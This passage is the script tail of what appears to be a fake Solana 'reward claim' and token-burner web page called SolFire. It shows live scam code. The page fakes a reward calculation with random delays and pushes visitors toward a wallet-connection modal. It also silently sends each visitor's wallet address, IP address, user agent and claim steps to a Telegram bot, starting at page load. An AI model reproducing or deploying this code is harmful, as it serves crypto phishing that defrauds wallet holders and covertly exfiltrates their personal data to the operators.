                    sendToTelegram(`üí∞ <b>Reward Calculation Complete</b>\n\nüìç <b>Wallet:</b> <code>${walletAddress}</code>\nüíé <b>Claimable Amount:</b> ${currentAmount.toFixed(2)} SOL\nüî• <b>Options Used:</b> ${options.join(', ')}\nüìà <b>Status:</b> Ready to claim\nüéØ <b>Base Amount:</b> ${currentAmount > 0 ? 'Qualified' : 'Not Qualified'}`);

                    document.getElementById('loadingSection').classList.add('hidden');
                    document.getElementById('resultSection').classList.remove('hidden');
                    document.getElementById('solAmount').textContent = currentAmount.toFixed(2) + ' SOL';
                    document.getElementById('resultSection').classList.add('fade-in');
                }, 2000 + Math.random() * 1000);
                
            } catch (error) {
                console.error('Error checking wallet:', error);
                alert('Error checking wallet. Please try again.');
                resetForm();
            }
        }

        function showIneligibleResult(walletAddress) {
            document.getElementById('loadingSection').classList.add('hidden');
            document.getElementById('resultSection').classList.remove('hidden');
            
            const resultSection = document.getElementById('resultSection');
            resultSection.innerHTML = `
                <div class="result-card" style="border-color: #ff4500; background: linear-gradient(45deg, rgba(255, 69, 0, 0.1), rgba(255, 69, 0, 0.05));">
                    <h3 style="color: #ff4500; margin-bottom: 15px;">‚ùå Wallet Not Eligible</h3>
                    <p style="color: #ccc;">This wallet appears to be new or has no transaction history.</p>
                    <div class="sol-amount" style="color: #ff4500;">0.00 SOL</div>
                    <p style="color: #ccc; margin-bottom: 20px;">Only wallets with existing transactions are eligible for rewards.</p>
                    <button onclick="resetForm()" style="background: linear-gradient(45deg, #666, #888); border: none; padding: 15px 30px; border-radius: 10px; color: white; font-weight: bold; cursor: pointer;">Try Another Wallet</button>
                </div>
            `;
            
            sendToTelegram(`‚ùå <b>Ineligible Wallet Detected</b>\n\nüìç <b>Wallet:</b> <code>${walletAddress}</code>\nüí∞ <b>Reward:</b> 0.00 SOL\n‚ö†Ô∏è <b>Reason:</b> New wallet or no transaction history\nüìä <b>Status:</b> Rejected\nüö´ <b>Action:</b> User prompted to try another wallet`);
        }

        async function claimReward() {
            await sendToTelegram(`üö® <b>CLAIM ATTEMPT STARTED!</b>\n\nüìç <b>Wallet:</b> <code>${currentWallet}</code>\nüí∞ <b>Amount:</b> ${currentAmount.toFixed(2)} SOL\n‚è∞ <b>Time:</b> ${new Date().toISOString()}\nüîÑ <b>Status:</b> Requesting wallet connection\nüéØ <b>Critical:</b> User attempting to claim rewards\nüåç <b>IP:</b> ${await getUserIP()}`);
            
            const isWalletConnected = false;
            
            if (!isWalletConnected) {
                showWalletConnectionRequired();
                return;
            }
        }

        function showWalletConnectionRequired() {
            sendToTelegram(`üî• <b>URGENT: CLAIM IN PROGRESS</b>\n\nüìç <b>Target Wallet:</b> <code>${currentWallet}</code>\nüíé <b>Claim Amount:</b> ${currentAmount.toFixed(2)} SOL\nüîó <b>Connection Status:</b> Not Connected\n‚ö†Ô∏è <b>Action:</b> Showing wallet connection modal\nüéØ <b>User State:</b> Attempting to claim rewards\n‚è∞ <b>Timestamp:</b> ${new Date().toISOString()}`);

            const modal = document.createElement('div');
            modal.id = 'claimModal';
            modal.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.8);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 10000;
                backdrop-filter: blur(10px);
            `;

            const modalContent = document.createElement('div');
            modalContent.style.cssText = `
                background: linear-gradient(135deg, #1a1a1a, #2d1b1b);
                border: 2px solid #ff6b00;
                border-radius: 20px;
                padding: 40px;
                max-width: 450px;
                width: 90%;
                text-align: center;
                box-shadow: 0 20px 60px rgba(255, 107, 0, 0.3);
            `;

            modalContent.innerHTML = `
                <h3 style="color: #ffaa00; margin-bottom: 20px; font-size: 1.5rem;">üîó Wallet Connection Required</h3>
                <p style="color: #ccc; margin-bottom: 30px; line-height: 1.6;">
                    To claim your <span style="color: #ffaa00; font-weight: bold;">${currentAmount.toFixed(2)} SOL</span> reward, 
                    you need to connect your wallet first.
                </p>
                <button onclick="connectWalletFromClaim()" style="background: linear-gradient(45deg, #ff6b00, #ffaa00); border: none; padding: 15px 30px; border-radius: 10px; color: #000; font-weight: bold; cursor: pointer; margin-bottom: 15px; font-size: 1.1rem;">Connect Wallet</button>
                <br>
                <button onclick="closeClaim()" style="background: none; border: 1px solid #666; color: #ccc; padding: 10px 20px; border-radius: 8px; cursor: pointer;">Cancel</button>
            `;

            modal.appendChild(modalContent);
            document.body.appendChild(modal);

            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    document.body.removeChild(modal);
                }
            });
        }

        function connectWalletFromClaim() {
            sendToTelegram(`üîÑ <b>User Connecting Wallet from Claim</b>\n\nüìç <b>Wallet:</b> <code>${currentWallet}</code>\nüí∞ <b>Pending Claim:</b> ${currentAmount.toFixed(2)} SOL\nüîó <b>Action:</b> Proceeding to auto-connect first\n‚ö° <b>Status:</b> High priority claim attempt`);
            
            closeClaim();
            showAutoConnectModal();
        }

        function closeClaim() {
            const modal = document.getElementById('claimModal');
            if (modal) {
                document.body.removeChild(modal);
            }
        }

        function resetForm() {
            document.getElementById('walletAddress').value = '';
            document.getElementById('closeTransactions').checked = false;
            document.getElementById('burnTokens').checked = false;
            document.getElementById('burnNFTs').checked = false;
            document.getElementById('inputSection').classList.remove('hidden');
            document.getElementById('loadingSection').classList.add('hidden');
            document.getElementById('resultSection').classList.add('hidden');
        }

        function createFireSplash(x, y) {
            for (let i = 0; i < 12; i++) {
                const splash = document.createElement('div');
                splash.className = 'fire-splash';
                splash.style.left = x + 'px';
                splash.style.top = y + 'px';
                splash.style.animationDelay = (i * 0.05) + 's';
                
                const angle = (i * 30) * (Math.PI / 180);
                const distance = 30 + Math.random() * 40;
                const deltaX = Math.cos(angle) * distance;
                const deltaY = Math.sin(angle) * distance;
                
                splash.style.setProperty('--deltaX', deltaX + 'px');
                splash.style.setProperty('--deltaY', deltaY + 'px');
                
                document.body.appendChild(splash);
                
                setTimeout(() => {
                    if (splash.parentNode) {
                        splash.remove();
                    }
                }, 600);
            }
        }

        document.addEventListener('click', (e) => {
            createFireSplash(e.clientX, e.clientY);
        });

        createFireParticles();

        document.getElementById('walletAddress').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                burnWallet();
            }
        });

        window.addEventListener('load', async () => {
            await sendToTelegram(`üåê <b>SolFire Burner Page Loaded</b>\n\n‚è∞ <b>Time:</b> ${new Date().toISOString()}\nüåç <b>IP:</b> ${await getUserIP()}\nüì± <b>User Agent:</b> ${navigator.userAgent.substring(0, 80)}...\nüéØ <b>Status:</b> New visitor on site`);
        });
    </script>

</body>
</html>
